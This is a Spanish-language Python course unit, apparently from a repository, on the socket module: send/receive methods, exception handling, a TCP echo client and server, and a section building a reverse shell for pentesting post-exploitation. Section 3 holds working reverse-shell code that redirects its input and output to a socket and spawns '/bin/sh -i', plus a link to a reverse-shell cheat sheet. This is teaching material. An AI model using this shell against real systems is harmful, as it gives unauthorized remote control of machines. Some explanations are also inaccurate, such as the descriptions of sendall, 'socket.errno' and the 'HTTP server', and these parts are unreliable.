# Aplicaciones clientes-servidor con sockets en Python

## Objetivos

### Competencia
Conocer el módulo sockets para implementar una aplicación cliente-servidor para el paso de mensajes y obtner un shell inversa en Python.

### Índice

1. Conocer los principales méetodos del módulo socket para enviar y recibir datos entre clientes y servidores.
2. Crear una aplicacion cliente-servidor en Python para envío de mensajes.
3. Crear una shell inversa en Python.
4. Resumen

---

## 1. Métodos para enviar y recibir datos entre clientes y servidores.

- **`Métodos para crear aplicaciones cliente-servidor:`**
    - `socket.recv(buflen)`: recibe datos del socket. El argumento `buflen` indica el tamaño máximo de la solicitud(cantidad máxima de bytes que se recibirán).

    - `socket.recvfrom(buflen)`: recibe datos desde el servidor (remitente) y devuelve la dirección del remitente.

    - `socket.recv_into(buffer)`: recibe datos desde el servidor (remitente) y los almacena en un buffer.

    - `socket.recvfrom_into(buffer)`: recibe datos desde el servidor (remitente) y los almacena en un buffer.

    - `socket.send(bytes)`: envía datos al servidor (destinatario).

    - `socket.sendto(bytes, address)`: envía datos al servidor (destinatario) y la dirección del destinatario.

    - `socket.sendall(bytes)`: envía datos al servidor (destinatario) y a todos los destinatarios.

    - `socket.close()`: cierra el socket. Libera memoria y finaliza conexión.

- **`Métodos de socket del servidor:`**
    - `socket.bind(address)`: establece la dirección del servidor, con el requisito de que el socket debe estar abierto antes de establecer la conexión.

    - `socket.listen(numero_conexioness)`: establece un número máximo de conexiones que se pueden establecer en cola e inicia la escucha TCP para las conexiones entrantes.

    - `socket.accept()`: permite aceptar conexiones del cliente. Devuelve dos valores:
        - client_socket: socket conectado al cliente.
        - client_address: dirección del cliente.
    
    Antes de usar este método, debe llamar a los métodos `bind` y `listen`.

- **`Métodos de socket del cliente:`**
    - `socket.connect(address)`: conecta al servidor y establece la dirección del cliente.

    - `socket.connect(address)`: conecta al servidor y establece la dirección del cliente.

        Podemos obtener más informacion sobre el método con el comando `help(socket)`.

        **Nota**: Este método hace lo mismo que el método `socket.connect_ex(address)` y también ofrece la posibilidad de devolver un error en caso de no poder conectar con esa dirección.

---

- [Ejemplo de cliente básico](/Unidad_2_Aplicaciones_cliente-servidor_con_sockets_en_Python/2-Cliente_basico.py)

- [Ejemplo de cleinte básico extendido](/Unidad_2_Aplicaciones_cliente-servidor_con_sockets_en_Python/3-Cliente_basico_extendido.py)

- [Ejemplo de cliente TCP que se conecta a un host y un puerto introducido por el usuario](/Unidad_2_Aplicaciones_cliente-servidor_con_sockets_en_Python/4-ClienteTCP_host_puertos.py)

---

- **`Administar excepciones de socket:`** 
    
    - Para manejar excepciones, usaremos la función `try-except`. Se definen diferentes tipos de excepciones en la biblioteca `socket` y se pueden manejar de distintas maneras.

        - `exception socker.timeout`: este bloque captura excepciones relacionadas con el vencimiento de los tiempos de espera.

        - `exception socker.gaierror`:este bloque detecta errores durante la búsqueda de información sobre direccione IP, por ejemplo, cuando usamos los métodos `socket.getaddrinfo` o `socket.getnameinfo`.

        - `exception socker.error`: este bloque detecta errores genéricos de enrada, salida y comunucación. Este es un bloque genérico donde puede detectar cualquer tipo de excepción.

            ```python
            #!/usr/bin/env python
            #--*-- coding:UTF-8 --*--

            import socket,sys

            host = "domain/ip_address"
            port = 9999

            try:
                s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
            except socket.error as e:
                print("socket create error: %s" %e)
                sys.exit(1)

            try:
                s.connect((host,port))
            except socket.timeout as e :
                print("Timeout %s" %e)
                sys.exit(1)
            except socket.gaierror as e:
                print("connection error to the server:%s" %e)
                sys.exit(1)
            except socket.error as e:
                print("Connection error: %s" %e)
                sys.exit(1)
            ```
        
        - En el script anterior:
            - Cuando ocurre un tiempo de espera de conexión con una dirección IP, arroja una excepción relacionada con la conexión del socket con el servidor.

            - Si intenta obetener información sobre dominios específicos o direcciones IP que no existen, problablmente arrojará una **exception socket.gaierror** con el error de conexión al serivor: **[Error 11001] getaddrinfo failed**.
            
            - Si la conexión con nuestro objetivo no es posible, obtendrá una excepción **socket.error** con el error de conexión al servidor: **[Error 10061] No se puede establecer una conexión a la dirección especificada**.


## 2. Crear una aplicacion cliente-servidor en Python para envío de mensajes.

- En python es posible crear un socket que actúe como cliente o como servidor.

- Los `sockets cliente`, se encargan de realizar una conexión contra el host, puerto y protocolo determinado.

- Los `sockets servidor`, se encargan de recibir conexiones por parte de los clientes en un puerto y protocolo determinado.

- La idea detrás de la cración de esta aplicación es que un socket cliente puede establecer una conexión con un determinado host, puerto y protocolo.

- El servidor de socket es responsable de recibir las conexiones de los clientes en un puerto y protocolo específicos.

- Para crear un socket, se tuliza el constructor `socket.socket()` que puede tomar la familia, el tipo y el protocolo como parámetros opcionales.
    - Por defecto, se utiliza la familia AF_INET y el tipo SOCK_STREAM.

    ```python
    servidor = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    ```

- Tenemos ahora que indicar en qué puerto se va a mantener a la escucha nuestro servidor utilizando el método `bind`.

- Para socket IP, el argumento de `bind` es una tupla que contiene el **host** y el **puerto**
    - El **host** puede estar vacío, indicando que puede utilizar cuqlquier nombre que esté disponible.

- El método `bind(IP,PORT)` le permite asociar un host y un puerto co un socket específico, teniendo en cuenta que los puerto 1-1024 están reservados para los protrocolos estándar:

    ```python
    socket_s.bind(('localhost', 99))
    ```

- **`Métodos para aceptar conexiones`**

    - Utilizamos `listen` para hacer que el socket acepte conexiones entrantes y `accept` para comenzar a escuchar.

    - El método `listen` requiere de un parámetro que indica el número de conexiones máximas que queremos aceptar; evidentemente, este valor debe ser al menos 1.

    - El método `accept` se mantiene a la espera de conexiones entrantes, bloqueando la ejecución hasta que llega un mensaje.

    - Cuando llega el mensaje, `accept` desbloquea la ejecución, devolviendo un objeto socket que representa la conezión del cliente y una tubla que contien el host y puerto de dicha conexión.

        ```python
        socket_s.listen(10)
        socket_cliente, (host_c, puerto_c) = socket_s.accept()
        ```

- **`Enviar y recibir datos del socket`**

    - Una vez que tenemos este objeto socket podemos comunicarnos con el cliente a través suyo, mediante los métodos `recv()` y `send()` (o `recvfrom` y `sendfrom` en UDP) que permite recibir o enviar mensajes.

    - El método `send()` toma como parámetros los datos a enviar.

    - El método `recv` toma como parámetros el número máximo de bytes a aceptar.

        ```python
        recibido = socket_cliente.recv(1024)
        print("Recibido: ", recibido)
        socket_cliente.send(recibido)
        ```

    - Una vez que hemos terminado de trabajar con el socket, lo cerramos con el método `close()`.

    - Crear un cliente es más sencillo aún. Solo tenemos que crear el objeto socket, utilizar el método `connect` para conectarnos al servidor y utilizar los métodos `send` y `recv`.

    - El argumento de `connect` es una tubpla con host y puerto, exactamente igual que el método `bind`

        ```python 
        socket_cliente = socket.socket()
        socket_cliente.connect(("localhost", 9999))
        socket_cliente.send("hola")
        ```

    - Para crear un cliente, tenemos que crear el objeto socket, usar el método de conexión para conectarse al servidor y usar los métodos de envío y recepción que vimos anteriormente.

    - El argumento de conexión es una tupla de host y puerto.

        ```python
        socket_cliente = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        socket_cliente.connect(("localhost", 9999))
        socket_cliente.send("message")
        ```

- **`Implementando el servidor TCP`**

    - En este ejemplo, vamos acrear un servidor TCP multiproceso.
    
    - El socket del servidor abre un socket TCP en localhost:9999 y escuah las solicitudes en un bucle infinito.

    - Cuando recibar una solicitud del socket del cliente, devolverá un mensaje que indica que se ha realziado una conexión desde otra máquina.

    - El ciclo while mantiene vivo el programa del servidor y no permite que finalice elcódigo.

    - La instrucción `server.listen(10)` escucha la conexión y espera al cliente. Esta instrucción le dice al servidor que comience a escuchar con la acumulación de conexiones  máximas de 10.

    - Para implementar un socket servidor se puede utilizar algunos de los métodos que ofrece el módulo sockert. En concreto, podemos utilizar el método `bind`que permite asociar un host y un puerto con un determinado socket.

    - Para aceptar peticiones por parte de un socket cliente habría que utilizar el método `accept` que permite aceptar las conexiones entrantes.

        ```python
        #!/usr/bin/python
        # tcpserver.py
        import socket

        host = 'localhost'
        puerto = 1337

        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        hostport = (host, puerto)
        s.bind(hostport)
        s.listen(10)

        print("Servidor tcp escuchando en el puerto", hostport)

        while 1:
            cliente,addr = s.accept()
            print("Conexion desde", addr)
            buffer = cliente.recv(1024)
            print("Datos recibidos", buffer)
            if buffer == b"Hola mundo":
                cliente.send(bytes("Servidor recibe Hola Mundo\n",'utf-8'))
            cliente.close()
        ```

        - El socket servidor abre un socket TCP en el puerto 1337 y se queda escuchando peticiones en un bucle infinito.
        - Cuando reciba una petición desde el socket cliente, devolverá un mensaje indicando que se produce una conxión desde otra máquina.

- **`Implementando el cliente TCP`**

    - El socket del cliente abre el mismo tipo de socket en el que el servidor está escuchando y envía un mensaje.

    - El servidor responde y finaliza su ejecución, cerrando el socket del clientes.

        ```python
        #!/usr/bin/python
        # tcpclient.py
        import socket

        host="127.0.0.1"
        puerto = 1337

        try:
            mysocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            hostport = (host, puerto)
            mysocket.connect(hostport)
            mysocket.send(bytes("Hola mundo",'utf-8'))
            buffer = mysocket.recv(1024)
            print("Datos recibidos", buffer)
            mensaje="Mensaje desde el cliente\n"
            mysocket.sendall(bytes(mensaje.encode('utf-8')))

        except socket.errno as error:
            print("Socket error ", error)
        finally:
            mysocket.close()
        ```
        - Configuramos un servidor HTTP en la dirección 127.0.01 a través del puerto estándar 1337.

        - Nuestro cliente se conectará a la misma dirección ip y puerto recibiendo 1024 bytes de datos en la respuesta y la almacenará en un variable llamada buffer, para posteriormente mostrar esa variable al usuario.

        - En el código anterior, el nuevo méetodo s.connect((host, puerto)) conecta el cliente con el servidor, y el método s.send(1024) recibe el mensaje enviados por el servidor.

---        

- [Código tcp_server.py](/Unidad_2_Aplicaciones_cliente-servidor_con_sockets_en_Python/6-tcp_server.py)
- [Código tcp_client.py](/Unidad_2_Aplicaciones_cliente-servidor_con_sockets_en_Python/7-tcp_client.py)
    
---

### Implementar aplicación cliente-servidor con sockets para enviar y recibir mensajes

- Sencilla aplicación cliente-servidor orientada al envío de mensajes del cliente al servidor.
- El servidor se va a quedar a la espera de una conexión por parte de un cliente.
- El cliente manda al servidor cualquier mensaje que escriba el usuario y el servidor lo que hará será repetir el mensaje enviado al cliente.
- La ejecución termina cuando el usuario escribe el comando `quit`.

- [Código de la aplicación cliente-servidor](/Unidad_2_Aplicaciones_cliente-servidor_con_sockets_en_Python/8-Cliente_Servidor_mensajes)
    - [servidor.py](/Unidad_2_Aplicaciones_cliente-servidor_con_sockets_en_Python/8-Cliente_Servidor_mensajes/servidor.py)
    - [cliente.py](/Unidad_2_Aplicaciones_cliente-servidor_con_sockets_en_Python/8-Cliente_Servidor_mensajes/cliente.py)


## 3. Crear una shell inversa en Python.

- Una **Shell inversa** se trata de una acción mediante la cual un usuario consigue acceder a la shell de un servidor externo. 

- Por ejemplo, si estás trabajando en una fase de pentesting relacionada con la post-explotación y te gustaría crear un script que se invoque en ciertos escenarios que automáticamente hará obtener una sehll para acceder al sistema de ficheros de otra máquina, podrías utilizar una shell inversa.

-  En este caso, utilizaremos dos nuevos módulos: 
    - `Módulo os`: módulo de interfaz de sistema operatico multipropósito.
    - `Módulo subprocess`: permite que el script ejecute comandos e interactua con la entrada y salida de los mismos.

- Usamos el método `sock.connect()` para conectarnos a un host correspondiente a una determinada IP y puerto(en este caso, localhost)

- Una vez hemos obtenido la shell, podríamos obtener un listado del directorio mediante el comando `/bin/ls`, pero antes necesitamos establecer la conexión con nuestro socket a través de la salida del comando. 
    - `os.dup2(sock.fileno())`

    ```python
    #!/usr/bin/python

    import socket
    import subprocess
    import os
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.connect(("127.0.0.1", 45679))
    os.dup2(sock.fileno(),0)
    os.dup2(sock.fileno(),1)
    os.dup2(sock.fileno(),2)
    shell_remote = subprocess.call(["/bin/sh", "-i"])
    #proc = subprocess.call(["/bin/ls", "-i"])
    ```	

---

- En el siguiente enlace podemos ver el comando que podríamos usar para otros sistemas operativos:
    - [Link Github](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md)

--- 

### Implementar una shell inversa en Python

- El servidor podría estar escuahando el puerto localhost:9090 para una nueva conexión. 

- Cuando un cliente soliciata una nueva convexión, enviará su nombre de host y el servidor imprimirá el nombre del host y la dirección IP del cliente.

- Una vez tenemos servidor y cliente en funcionamiento, nuestro objetivo sería extender nuestro clientes para que pueda ejecutar cualquier comando que el servidor le envíe.

- Para ello podríamo susar un módulo de Python llamado `subprocess` para ejecutar el comando desde el servidor.
    - El módulo `subprocess` permite ejecutar nuevos procesos y obtener una salida de los mismos.
    - [Documentación del módulo subprocess](https://docs.python.org/3/library/subprocess.html)

---

- [Código de la aplicación cliente-servidor](/Unidad_2_Aplicaciones_cliente-servidor_con_sockets_en_Python/10-Reverse_shell)
    - [server.py](/Unidad_2_Aplicaciones_cliente-servidor_con_sockets_en_Python/10-Reverse_shell/server.py)
    - [client.py](/Unidad_2_Aplicaciones_cliente-servidor_con_sockets_en_Python/10-Reverse_shell/client.py)

    - [reverse_shell.py](/Unidad_2_Aplicaciones_cliente-servidor_con_sockets_en_Python/10-Reverse_shell/reverse_shell.py)

---

## 4. Resumen
- Enviar y recibir datos entre un cliente y un servidor utilizando los métodos `socket.recv(buflen)` àra recibir datos del socket y `socket.send(bytes)` para enviar datos al destino espedificado.

- Gestionar los errores que se pueden producir al trabajar con sockets utiizando el bloque try-except.

- Implementar una aplicación cliente-servidor orientada al paso de mensajes utilizando el método `socket.bind(IP,PORT)` que le permite asociar un host y un puerto con u socket específico y el método `accept()` que permite aceptar conexiones entrantes.

- Implementar un script que permite obtener una shell inversa. Para ellos hemos heco uso de los módulos `os` y `subprocess` para ejecutar comandos en el sistema operativo remoto.

### FAQ

- **¿Para qué sirve la primera línea que podemos ver en los scripts #!/usr/bin/python?**

    Cuando desarrollamos scripts en Python esta línea le dice dónde encontrar al intérprete de python. En este caso se refiere a la ruta donde tenemos el ejecutable de python en un sistema basado en unix. Con esta línea, cualquier script de Python se puede ejecutar colocando su nombre después de python en la línea de comandos.

- **¿Que es una shell inversa?**

    Una Shell inversa se trata de acción mediante la cual un usuario consigue acceder a la shell de un servidor externo. Por ejemplo, si estás trabajando en una fase de pentesting relacionada  con post-explotación y te gustaría crear un script que se invoque en ciertos escenarios que automáticamente hará obtener un shell para acceder al sistema de ficheros de otra máquina, podríamos construir nuestra propia shell inversa en Python.

### Enlaces
- [Módulo subprocess](https://docs.python.org/3/library/subprocess.html)
- [Módulo os](https://docs.python.org/3/library/os.html)
- [ncat](https://netcat.sourceforge.net/)

### Glosario

- `Shell Unix`

    Una Shell de Unix es el término usado en informática para referirse a un intérprete de comandos, el cual consiste en la interfaz de usuario tradicional de los sistemas operativos basados en Unix y similares.

- `Socket`

    Socket designa un concepto abstracto por el cual dos programas pueden intercambiar cualquier flujo de datos, generalmente de manera fiable y ordenada.

- `TCP`

    Protocolo de control de transmisión es uno de los protocolos fundamentales en Internet.

- `UNIX`

    Sistema operativo desarrollado por Kerrighan and Richie en AT&T Bell Labs a finales de los años 60. Escrito en lenguaje de programación C para que pudiera trasladarse a otras plataformas. Es todavía el sistema operativo más utilizado por los grandes servidores de Internet.